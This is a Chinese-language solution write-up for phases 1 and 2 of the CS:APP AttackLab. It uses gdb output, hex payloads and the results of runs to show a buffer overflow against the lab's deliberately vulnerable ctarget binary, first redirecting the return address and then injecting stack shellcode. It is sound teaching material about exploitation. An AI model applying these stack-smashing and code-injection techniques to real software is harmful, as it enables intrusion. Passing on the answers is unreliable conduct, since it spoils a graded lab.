## AttackLab

### Preparation

1. 栈帧结构

   ![https://i.imgur.com/uKHxdys.png](https://i.imgur.com/uKHxdys.png)

### Phase 1

根据提示，Phase 1 中告诉我们 ctarget 程序运行时的有效信息如下：

1. ctarget 会先调用 `test` 函数。

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

2. `getbuf` 类似与 C 标准库中的  `gets`函数

3. 这个程序里同时存在一个 `touch1 `函数，我们要做的是通过输入数据，执行到 `touch1`函数

```c
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

首先，我们肯定要看一下 `getbuf` 这个函数做了些什么。

```assembly
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp # 开辟0x28字节（40字节）栈空间
   0x00000000004017ac <+4>:     mov    %rsp,%rdi # 给到第一个参数
   0x00000000004017af <+7>:     call   0x401a40 <Gets> # 读入40个字节到栈内存。但是正因为它说明了和 gets 函数相同，说明它不会判断缓冲区的大小，有可能导致读入超出 40 个字节从而污染调用栈
   0x00000000004017b4 <+12>:    mov    $0x1,%eax # 设置返回值为 1
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
```

当读入超过给定缓冲区大小的数据时，`gets` 函数就会污染调用栈，从而产生安全问题，这也是 `gets` 函数被不建议使用的原因。根据栈帧结构，可以分析出

```assembly
%rsp -- %rsp - 0x28 : 缓冲区数组
%rsp + 0x8 -- %rsp : 返回地址
```

原本 `%rsp + 0x8 -- %rsp` 应该返回到 `printf` 语句所在的地址，只需要把这个地址覆盖为 `touch1` 函数的地址即可。

```assembly
(gdb) x touch1
0x4017c0 <touch1>:      0x08ec8348
```

如下：缓冲区数据可以任意填写。

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

通过 hex2raw 程序可以将 16 进制字符串转换为 2进制字符串（空格和换行都会被 trim 掉）

```bash
❯ ./hex2raw < ./ans/phase_1.txt > ./ans/phase_1
❯ ./ctarget -qi ./ans/phase_1
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```

在我的本机测试，直接一段命令使用管道运算符会出现段错误，目前原因未知，推测可能是 `-i`参数的问题，见 Phase 2。

### Phase 2

与Phase 1 共有一个程序，Phase 2 要求我们调用到 touch2 函数，并且正确传入参数（在 cookie.txt 里）

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

思路比较简单。因为  `test` 函数会向栈空间写入数据，只要栈内存是可执行的，我们可以把在 Phase 1里填入的无用的数据换成自己编写的代码。然后在移除后的返回地址从 `touch1` 函数的地址换成我们自己编写的代码的首地址。

我们自己编写的那段代码需要做两件事：

1. 需要将 `%rsi` 寄存器修改为我们想要的值
2. 调用 `touch2` 函数。（将 `touch2` 函数的地址压栈后调用 `ret` 指令即可实现）

首先找一下  `touch2` 函数的地址

```assembly
(gdb) p touch2
$1 = {void (unsigned int)} 0x4017ec <touch2>
```

据此得到我们应该编写的汇编代码

```assembly
mov    $0x59b997fa,%rdi
push   $0x4017ec
ret
```

通过 `gcc -c` 命令汇编成机器码后可以使用其他程序将其转换为机器码对应的 16 进制表示或通过 `objdump -d` 转换。

但是还有一个问题，就是如何确定我们要修改 `test` 函数的返回地址。因为这个程序没有开启栈随机化，每次运行时栈地址确定的，所以可以打断点运行一下找到栈顶地址就是我们写入代码的第一个地址。

```assembly
(gdb) b *0x4017ac
Breakpoint 1 at 0x4017ac: file buf.c, line 14.
(gdb) r -q -i ./ans/phase_1 # 经过尝试不写 -i 参数会出现段错误，所以借用下 phase 1 的答案，反正不会对我们要找的栈指针造成影响
Starting program: /mnt/d/Projects/Personal/csapp-lab/attacklab/attack-handout/ctarget -q -i ./ans/phase_1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:14
14      buf.c: No such file or directory.
(gdb) p/x $rsp
$1 = 0x5561dc78
```

得到我们注入代码的首地址是 `0x5561dc78` ，把这段地址替换掉 Phase 1 中的 `touch2` 函数地址即可

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

当然注入的代码也可以写道中间行，然后返回地址也需要对栈顶指针相应加一个偏移量指向我们注入代码的首地址，不过真的有人会这样做吗？